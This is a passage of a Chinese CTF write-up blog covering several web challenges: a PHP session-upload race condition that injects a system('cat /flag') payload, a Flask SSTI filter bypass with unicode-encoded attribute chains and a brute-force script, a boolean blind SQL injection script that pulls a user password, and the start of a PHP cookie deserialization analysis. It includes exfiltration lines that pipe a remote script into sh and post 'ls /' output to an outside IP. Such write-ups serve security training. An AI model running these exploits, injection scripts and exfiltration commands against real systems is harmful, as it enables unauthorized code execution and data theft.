function_">sess_upload</span>(<span class="params">url,s</span>):</span><br><span class="line">    <span class="keyword">global</span> check</span><br><span class="line">    <span class="keyword">while</span> check:</span><br><span class="line">        data=&#123;</span><br><span class="line">              <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&quot;&lt;?php echo &#x27;working&#x27;,system(&#x27;cat /flag&#x27;);?&gt;\&quot;); ?&gt;&quot;</span></span><br><span class="line">              &#125;</span><br><span class="line">        cookies=&#123;</span><br><span class="line">            <span class="string">&#x27;PHPSESSID&#x27;</span>: <span class="string">&#x27;chaaa&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">        files=&#123;</span><br><span class="line">            <span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;chaaa.png&#x27;</span>, <span class="string">b&#x27;cha&#x27;</span>*<span class="number">300</span>)</span><br><span class="line">            &#125;</span><br><span class="line">        s.post(url=url,data=data,cookies=cookies,files=files)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>(<span class="params">ip, port</span>):</span><br><span class="line">    url = <span class="string">&quot;http://&quot;</span>+ip+<span class="string">&quot;:&quot;</span>+port+<span class="string">&quot;/&quot;</span></span><br><span class="line">    fileurl = url+<span class="string">&#x27;file.php&#x27;</span></span><br><span class="line">    uploadurl = url+<span class="string">&#x27;upload.php&#x27;</span></span><br><span class="line">  </span><br><span class="line">    num = threading.active_count()</span><br><span class="line">    <span class="comment"># 上传phar文件</span></span><br><span class="line">    file = &#123;<span class="string">&#x27;file&#x27;</span>: <span class="built_in">open</span>(<span class="string">&#x27;./shell.png&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>)&#125;</span><br><span class="line">    ret = requests.post(url=uploadurl, files=file)</span><br><span class="line">    <span class="comment"># 文件上传条件竞争获取flag</span></span><br><span class="line">    event=threading.Event()</span><br><span class="line">    s1 = requests.Session()</span><br><span class="line">    s2 = requests.Session()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">        threading.Thread(target=sess_upload,args=(uploadurl,s1)).start()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">        threading.Thread(target=include,args=(fileurl,s2,)).start()</span><br><span class="line">    event.<span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">while</span> threading.active_count() != num:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp(HOST, PORT)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<h2 id="思考："><a href="#思考：" class="headerlink" title="思考："></a>思考：</h2><p>这个题除了官方的session文件包含实现rce外，还有没有别的方法，既然有include本地无法包含马儿（马儿上传被限制），那么远程包含可以吗？查看phpinfo信息<code>allow_url_fopen = on</code> 和 <code>allow_url_include = off</code>，前者用于file_get_content，而后者用于<code>include</code>,因此我们没有办法通过控制include函数的参数来包含远程的文件。</p>
<h1 id="Harddisk"><a href="#Harddisk" class="headerlink" title="Harddisk"></a>Harddisk</h1><h2 id="考点：-1"><a href="#考点：-1" class="headerlink" title="考点："></a>考点：</h2><p>Flask SSTI bypass</p>
<p>SSTI 盲注</p>
<h2 id="题解：-1"><a href="#题解：-1" class="headerlink" title="题解："></a>题解：</h2><p>打开题目是一个输入框，根据题目提示判断存在ssti，存在过滤，拿脚本跑一下，记得设置一下延迟</p>
<p><img src="/img/loading.gif" data-original="/img/image-20220919190707-r4n3199.png" alt="image.png"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#125;&#125;, &#123;&#123;, ], [,  , +, _, ., x, g, request, <span class="keyword">print</span>, args, values, input, globals, getitem, <span class="class"><span class="keyword">class</span>, <span class="title">mro</span>, <span class="title">base</span>, <span class="title">session</span>, <span class="title">add</span>, <span class="title">chr</span>, <span class="title">ord</span>, <span class="title">redirect</span>, <span class="title">url_for</span>, <span class="title">popen</span>, <span class="title">os</span>, <span class="title">read</span>, <span class="title">flag</span>, <span class="title">config</span>, <span class="title">builtins</span>, <span class="title">get_flashed_messages</span>, <span class="title">get</span>, <span class="title">subclasses</span>, <span class="title">form</span>, <span class="title">cookies</span>, <span class="title">headers</span></span></span><br></pre></td></tr></table></figure>

<p>这里的话就直接是对症下药了，过滤了<code>&#123;&#123;` `&#125;&#125;</code> ，那这里就要考虑使用<code>&#123;% print(....) %&#125;</code> 和<code>&#123;% if .. %&#125;success&#123;% endif %&#125;</code> 通过fuzz可以发现过滤了print，那么第一种不能使用，第二种的话便不能回显命令执行的结果，这里可以使用外带数据的方式拿到flag，<code>.</code> 可以使用<code>|attr()</code> 绕过，<code>_</code> 可以使用<code>unicode</code> 编码绕过，同时attr也支持unicode编码，<code>[ 和 ]</code> 的话可以使用<code>getitem</code> 配合<code>attr</code> 来进行绕过，接下来就是对payload进行替换</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;%<span class="keyword">if</span>(<span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>].<span class="title function_ invoke__">__subclasses__</span>()[遍历].__init__.__globals__[<span class="string">&quot;popen&quot;</span>])%&#125;success&#123;%<span class="keyword">endif</span>%&#125;  </span><br><span class="line"></span><br><span class="line">--&gt;&gt;  </span><br><span class="line"></span><br><span class="line">&#123;%<span class="keyword">if</span>(<span class="string">&quot;&quot;</span>|<span class="title function_ invoke__">attr</span>(<span class="string">&quot;__class__&quot;</span>)|<span class="title function_ invoke__">attr</span>(<span class="string">&quot;__bases__&quot;</span>)|<span class="title function_ invoke__">attr</span>(<span class="string">&quot;__getitem__&quot;</span>)(<span class="number">0</span>)|<span class="title function_ invoke__">attr</span>(<span class="string">&quot;__subclasses__&quot;</span>)()|<span class="title function_ invoke__">attr</span>(<span class="string">&quot;__getitem__&quot;</span>)(遍历)|<span class="title function_ invoke__">attr</span>(<span class="string">&quot;__init__&quot;</span>)|<span class="title function_ invoke__">attr</span>(<span class="string">&quot;__globals__&quot;</span>)|<span class="title function_ invoke__">attr</span>(<span class="string">&quot;__getitem__&quot;</span>)(<span class="string">&quot;popen&quot;</span>))%&#125;success&#123;%<span class="keyword">endif</span>%&#125;  --&gt;&gt;  </span><br><span class="line"></span><br><span class="line">--&gt;&gt;  </span><br><span class="line"></span><br><span class="line">&#123;%<span class="keyword">if</span>(<span class="string">&quot;&quot;</span>|<span class="title function_ invoke__">attr</span>(<span class="string">&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;</span>)|<span class="title function_ invoke__">attr</span>(<span class="string">&quot;\u005f\u005f\u0062\u0061\u0073\u0065\u0073\u005f\u005f&quot;</span>)|<span class="title function_ invoke__">attr</span>(<span class="string">&quot;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&quot;</span>)(<span class="number">0</span>)|<span class="title function_ invoke__">attr</span>(<span class="string">&quot;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&quot;</span>)()|<span class="title function_ invoke__">attr</span>(<span class="string">&quot;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&quot;</span>)(遍历)|<span class="title function_ invoke__">attr</span>(<span class="string">&quot;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&quot;</span>)|<span class="title function_ invoke__">attr</span>(<span class="string">&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;</span>)|<span class="title function_ invoke__">attr</span>(<span class="string">&quot;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&quot;</span>)(<span class="string">&quot;\u0070\u006f\u0070\u0065\u006e&quot;</span>))%&#125;success&#123;%<span class="keyword">endif</span>%&#125;</span><br></pre></td></tr></table></figure>

<p>找popen的话简单写一个脚本遍历一下即可：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">120</span>,<span class="number">500</span>):</span><br><span class="line">    url = <span class="string">&quot;http://2667426a-a13b-4c20-b7ef-01c0671d1f45.node4.buuoj.cn:81/&quot;</span></span><br><span class="line">    payload = &#123;<span class="string">&quot;nickname&quot;</span>:<span class="string">&#x27;&#123;%if(&quot;&quot;|attr(&quot;\\u005f\\u005f\\u0063\\u006c\\u0061\\u0073\\u0073\\u005f\\u005f&quot;)|attr(&quot;\\u005f\\u005f\\u0062\\u0061\\u0073\\u0065\\u0073\\u005f\\u005f&quot;)|attr(&quot;\\u005f\\u005f\\u0067\\u0065\\u0074\\u0069\\u0074\\u0065\\u006d\\u005f\\u005f&quot;)(0)|attr(&quot;\\u005f\\u005f\\u0073\\u0075\\u0062\\u0063\\u006c\\u0061\\u0073\\u0073\\u0065\\u0073\\u005f\\u005f&quot;)()|attr(&quot;\\u005f\\u005f\\u0067\\u0065\\u0074\\u0069\\u0074\\u0065\\u006d\\u005f\\u005f&quot;)(&#x27;</span> + <span class="built_in">str</span>(i) + <span class="string">&#x27;)|attr(&quot;\\u005f\\u005f\\u0069\\u006e\\u0069\\u0074\\u005f\\u005f&quot;)|attr(&quot;\\u005f\\u005f\\u0067\\u006c\\u006f\\u0062\\u0061\\u006c\\u0073\\u005f\\u005f&quot;)|attr(&quot;\\u005f\\u005f\\u0067\\u0065\\u0074\\u0069\\u0074\\u0065\\u006d\\u005f\\u005f&quot;)(&quot;\\u0070\\u006f\\u0070\\u0065\\u006e&quot;))%&#125;success&#123;%endif%&#125;&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">    res = requests.post(url=url, headers=headers, data=payload)</span><br><span class="line">    <span class="built_in">print</span>(res.text)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;success&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure>

<p>然后就是反弹shell或者（题目服务器存在curl服务）curl外带数据即可。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">curl https://your-shell.com/ip:port |sh</span><br><span class="line">curl <span class="number">47.</span>xxx.xxx<span class="number">.72</span>:<span class="number">2333</span> -d \<span class="string">&quot;`ls /`\&quot;</span></span><br><span class="line"><span class="string">payload: &#123;%if(&quot;</span><span class="string">&quot;|attr(&quot;</span>\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005<span class="string">f&quot;)|attr(&quot;</span>\u005f\u005f\u0062\u0061\u0073\u0065\u0073\u005f\u005<span class="string">f&quot;)|attr(&quot;</span>\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005<span class="string">f&quot;)(0)|attr(&quot;</span>\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005<span class="string">f&quot;)()|attr(&quot;</span>\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005<span class="string">f&quot;)(132)|attr(&quot;</span>\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005<span class="string">f&quot;)|attr(&quot;</span>\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005<span class="string">f&quot;)|attr(&quot;</span>..........<span class="string">&quot;)|attr(&quot;</span>\u0072\u0065\u0061\u0064<span class="string">&quot;)())%&#125;1&#123;%endif%&#125;</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/loading.gif" data-original="/img/image-20220920102922-x697z5v.png" alt="image.png"></p>
<h1 id="绝对防御"><a href="#绝对防御" class="headerlink" title="绝对防御"></a>绝对防御</h1><h2 id="考点：-2"><a href="#考点：-2" class="headerlink" title="考点："></a>考点：</h2><p>接口api发现</p>
<p>sql注入</p>
<h2 id="题解：-2"><a href="#题解：-2" class="headerlink" title="题解："></a>题解：</h2><p>进入题目发现就一张图片和一大堆的接口，这里使用<code>jsfinder</code> 找一下有没有可用的接口</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">url:http://1c7f8807-835c-<span class="number">4099</span>-a9f6-6cf8f5eb2607.node4.buuoj.cn:<span class="number">81</span>/</span><br><span class="line">Find <span class="number">31</span> URL:</span><br><span class="line">http://1c7f8807-835c-<span class="number">4099</span>-a9f6-6cf8f5eb2607.node4.buuoj.cn:<span class="number">81</span>/2V.ny</span><br><span class="line">http://1c7f8807-835c-<span class="number">4099</span>-a9f6-6cf8f5eb2607.node4.buuoj.cn:<span class="number">81</span>/a4?4a=</span><br><span class="line">http://1c7f8807-835c-<span class="number">4099</span>-a9f6-6cf8f5eb2607.node4.buuoj.cn:<span class="number">81</span>/qk.js</span><br><span class="line">http://1c7f8807-835c-<span class="number">4099</span>-a9f6-6cf8f5eb2607.node4.buuoj.cn:<span class="number">81</span>/2V.js</span><br><span class="line">http://1c7f8807-835c-<span class="number">4099</span>-a9f6-6cf8f5eb2607.node4.buuoj.cn:<span class="number">81</span>/a4</span><br><span class="line">http://1c7f8807-835c-<span class="number">4099</span>-a9f6-6cf8f5eb2607.node4.buuoj.cn:<span class="number">81</span>/rN.js?a9=</span><br><span class="line">http://1c7f8807-835c-<span class="number">4099</span>-a9f6-6cf8f5eb2607.node4.buuoj.cn:<span class="number">81</span>/<span class="number">1J</span>/s1.js?5q=</span><br><span class="line">http://1c7f8807-835c-<span class="number">4099</span>-a9f6-6cf8f5eb2607.node4.buuoj.cn:<span class="number">81</span>/fN://uk.tJ<span class="number">.8j</span>/r0/-<span class="number">1</span></span><br><span class="line">http://1c7f8807-835c-<span class="number">4099</span>-a9f6-6cf8f5eb2607.node4.buuoj.cn:<span class="number">81</span>/this.program</span><br><span class="line">http://1c7f8807-835c-<span class="number">4099</span>-a9f6-6cf8f5eb2607.node4.buuoj.cn:<span class="number">81</span>/dev/stdin</span><br><span class="line">http://1c7f8807-835c-<span class="number">4099</span>-a9f6-6cf8f5eb2607.node4.buuoj.cn:<span class="number">81</span>/tmp</span><br><span class="line">http://1c7f8807-835c-<span class="number">4099</span>-a9f6-6cf8f5eb2607.node4.buuoj.cn:<span class="number">81</span>/home</span><br><span class="line">http://1c7f8807-835c-<span class="number">4099</span>-a9f6-6cf8f5eb2607.node4.buuoj.cn:<span class="number">81</span>/home/web_user</span><br><span class="line">http://1c7f8807-835c-<span class="number">4099</span>-a9f6-6cf8f5eb2607.node4.buuoj.cn:<span class="number">81</span>/dev</span><br><span class="line">http://1c7f8807-835c-<span class="number">4099</span>-a9f6-6cf8f5eb2607.node4.buuoj.cn:<span class="number">81</span>/dev/null</span><br><span class="line">http://1c7f8807-835c-<span class="number">4099</span>-a9f6-6cf8f5eb2607.node4.buuoj.cn:<span class="number">81</span>/dev/tty</span><br><span class="line">http://1c7f8807-835c-<span class="number">4099</span>-a9f6-6cf8f5eb2607.node4.buuoj.cn:<span class="number">81</span>/dev/tty1</span><br><span class="line">http://1c7f8807-835c-<span class="number">4099</span>-a9f6-6cf8f5eb2607.node4.buuoj.cn:<span class="number">81</span>/dev/shm</span><br><span class="line">http://1c7f8807-835c-<span class="number">4099</span>-a9f6-6cf8f5eb2607.node4.buuoj.cn:<span class="number">81</span>/dev/shm/tmp</span><br><span class="line">http://1c7f8807-835c-<span class="number">4099</span>-a9f6-6cf8f5eb2607.node4.buuoj.cn:<span class="number">81</span>/proc</span><br><span class="line">http://1c7f8807-835c-<span class="number">4099</span>-a9f6-6cf8f5eb2607.node4.buuoj.cn:<span class="number">81</span>/proc/self</span><br><span class="line">http://1c7f8807-835c-<span class="number">4099</span>-a9f6-6cf8f5eb2607.node4.buuoj.cn:<span class="number">81</span>/proc/self/fd</span><br><span class="line">http://1c7f8807-835c-<span class="number">4099</span>-a9f6-6cf8f5eb2607.node4.buuoj.cn:<span class="number">81</span>/dev/stdout</span><br><span class="line">http://1c7f8807-835c-<span class="number">4099</span>-a9f6-6cf8f5eb2607.node4.buuoj.cn:<span class="number">81</span>/dev/stderr</span><br><span class="line">http://1c7f8807-835c-<span class="number">4099</span>-a9f6-6cf8f5eb2607.node4.buuoj.cn:<span class="number">81</span>/tokenGetHistoryMessage?_appid=app.web&amp;token=</span><br><span class="line">http://1c7f8807-835c-<span class="number">4099</span>-a9f6-6cf8f5eb2607.node4.buuoj.cn:<span class="number">81</span>/tokenSendMessage</span><br><span class="line">http://1c7f8807-835c-<span class="number">4099</span>-a9f6-6cf8f5eb2607.node4.buuoj.cn:<span class="number">81</span>/tokenRecallMessage</span><br><span class="line">http://1c7f8807-835c-<span class="number">4099</span>-a9f6-6cf8f5eb2607.node4.buuoj.cn:<span class="number">81</span>/sys/tokenUploadImage</span><br><span class="line">http://1c7f8807-835c-<span class="number">4099</span>-a9f6-6cf8f5eb2607.node4.buuoj.cn:<span class="number">81</span>/sys/tokenClearUnreadCount</span><br><span class="line">http://1c7f8807-835c-<span class="number">4099</span>-a9f6-6cf8f5eb2607.node4.buuoj.cn:<span class="number">81</span>/sys/tokenGetConversationList?_appid=app.web&amp;token=</span><br><span class="line">http://1c7f8807-835c-<span class="number">4099</span>-a9f6-6cf8f5eb2607.node4.buuoj.cn:<span class="number">81</span>/SUPPERAPI.php  //可以</span><br></pre></td></tr></table></figure>

<p>访问之后查看源码发现代码：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getQueryVariable</span>(<span class="params">variable</span>)</span><br><span class="line">&#123;</span><br><span class="line">       <span class="keyword">var</span> query = <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>.<span class="title function_">substring</span>(<span class="number">1</span>);</span><br><span class="line">       <span class="keyword">var</span> vars = query.<span class="title function_">split</span>(<span class="string">&quot;&amp;&quot;</span>);</span><br><span class="line">       <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;vars.<span class="property">length</span>;i++) &#123;</span><br><span class="line">               <span class="keyword">var</span> pair = vars[i].<span class="title function_">split</span>(<span class="string">&quot;=&quot;</span>);</span><br><span class="line">               <span class="keyword">if</span>(pair[<span class="number">0</span>] == variable)&#123;<span class="keyword">return</span> pair[<span class="number">1</span>];&#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span>(<span class="literal">false</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">check</span>(<span class="params"></span>)&#123;</span><br><span class="line">		<span class="keyword">var</span> reg = <span class="regexp">/[`~!@#$%^&amp;*()_+&lt;&gt;?:&quot;&#123;&#125;,.\/;&#x27;[\]]/im</span>;</span><br><span class="line">        <span class="keyword">if</span> (reg.<span class="title function_">test</span>(<span class="title function_">getQueryVariable</span>(<span class="string">&quot;id&quot;</span>))) &#123;</span><br><span class="line">            <span class="title function_">alert</span>(<span class="string">&quot;提示：您输入的信息含有非法字符！&quot;</span>);</span><br><span class="line">            <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span> = <span class="string">&quot;/&quot;</span></span><br><span class="line">         &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">check</span>()</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>通过burp发送数据报可以绕过前端js，简单测试之后发现sql语句正常回显的话显示<code>admin</code> ，如果函数被waf掉的话直接重定向到<code>404.html</code> ，简单手动fuzz一下发现ban掉了<code>union if sleep</code> 等函数，那么这里可以使用到布尔盲注，脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;XXX/SUPPERAPI.php?id=&quot;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">length = <span class="number">1000</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,length+<span class="number">1</span>):</span><br><span class="line">    left = <span class="number">32</span></span><br><span class="line">    right = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span>(left &lt;= right):</span><br><span class="line">        mid = (left + right)//<span class="number">2</span></span><br><span class="line">        <span class="comment">#payload = f&#x27;1 and (select length(database())&gt;&#123;mid&#125;)&#x27;</span></span><br><span class="line">        <span class="comment">#payload = f&#x27;1 and ascii(substr((select database()),&#123;i&#125;,1))&gt;&#123;mid&#125;&#x27;</span></span><br><span class="line">        <span class="comment">#payload = f&quot;id=1 and ascii(substr((select group_concat(column_name) from information_schema.columns where table_name = &#x27;users&#x27;), &#123;i&#125;, 1)) &gt; &#123;mid&#125;&quot;</span></span><br><span class="line">        payload = <span class="string">f&quot;id=1 and ascii(substr((select password from users where id=2), <span class="subst">&#123;i&#125;</span>, 1)) &gt; <span class="subst">&#123;mid&#125;</span>&quot;</span></span><br><span class="line">        res1 = requests.get(url=url+payload)</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;admin&#x27;</span> <span class="keyword">in</span> res1.text):</span><br><span class="line">            left = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            right = mid - <span class="number">1</span></span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">    res = res + <span class="built_in">chr</span>(left)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;***&#x27;</span>,left ,res)</span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>

<p><img src="/img/loading.gif" data-original="/img/image-20220921231349-170b2zv.png" alt="image.png"></p>
<p>这个题主要就是发现存在sql注入有点鸡肋，发现之后布尔盲注的难度不大</p>
<h1 id="Newser"><a href="#Newser" class="headerlink" title="Newser"></a>Newser</h1><h2 id="考点：-3"><a href="#考点：-3" class="headerlink" title="考点："></a>考点：</h2><p>composer.json 敏感信息泄露导致的部分源码泄露</p>
<p>cookie中的php反序列化以及php魔术方法</p>
<p>利用高版本php引用绕过__wakeup 的过滤</p>
<p>php反序列化匿名函数的利用</p>
<h2 id="链接：-1"><a href="#链接：-1" class="headerlink" title="链接："></a>链接：</h2><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/251366#h2-6">Opi&#x2F;Closure (闭包)函数RCE</a></p>
<h2 id="题解：-3"><a href="#题解：-3" class="headerlink" title="题解："></a>题解：</h2><p>简单进行代码审计</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$_password</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$_username</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$email</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$instance</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span>,<span class="variable">$email</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;email = <span class="variable">$email</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;instance = <span class="variable language_">$this</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getEmail</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;email;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getPassword</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getUsername</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_password = <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;password);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_username = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$this</span>-&gt;username);</span><br><span class="line">        <span class="keyword">return</span> [<span class="string">&#x27;_username&#x27;</span>,<span class="string">&#x27;_password&#x27;</span>, <span class="string">&#x27;email&#x27;</span>,<span class="string">&#x27;instance&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable language_">$this</span>-&gt;_password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;User &quot;</span>.<span class="variable language_">$this</span>-&gt;instance-&gt;_username.<span class="string">&quot; has created.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过前端的回显<code>User b3J0aXouc2hhbmVs has created.</code> ，发现这里的<code>__destruct()</code> 方法被调用，猜测考察反序列化，在<code>cookie</code> 中发现反序列化利用点<code>Set-Cookie: user=Tzo0OiJVc2VyIjo0OntzOjEyOiIAKgBfdXNlcm5hbWUiO3M6MjA6ImFtRmphMng1Ymk1cmIyVnNjR2x1IjtzOjEyOiIAKgBfcGFzc3dvcmQiO3M6MzI6ImJmN2RhN2U3YjAzOWM2NjJkYWYyYTZiODcyM2I4Y2VkIjtzOjExOiIAVXNlcgBlbWFpbCI7czoyMToiYXVndXN0OThAc2NoaW1tZWwuY29tIjtzOjE0OiIAVXNlcgBpbnN0YW5jZSI7cjoxO30%3D</code> 进行base64解码后发现对应<code>__sleep()</code>方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;User&quot;</span>:<span class="number">4</span>:&#123;s:<span class="number">12</span>:<span class="string">&quot;*_username&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;bmVsczc0&quot;</span>;s:<span class="number">12</span>:<span class="string">&quot;*_password&quot;</span>;s:<span class="number">32</span>:<span class="string">&quot;d0829bc048ce9bf2ef900d8604d71ca5&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;Useremail&quot;</span>;s:<span class="number">27</span>:<span class="string">&quot;chelsey.schroeder@gmail.com&quot;</span>;s:<span class="number">14</span>:<span class="string">&quot;Userinstance&quot;</span>;r:<span class="number">1</span>;&#125;</span><br><span class="line"><span class="comment">//在其中其实还存在由于protected 和private 反序列化之后产生的不可见字符</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/loading.gif" data-original="/img/image-20220924124640-g3hasfd.png" alt="image.png"></p>
<p>到这里还是没头绪，扫目录发现<code>composer.json</code>文件</p>
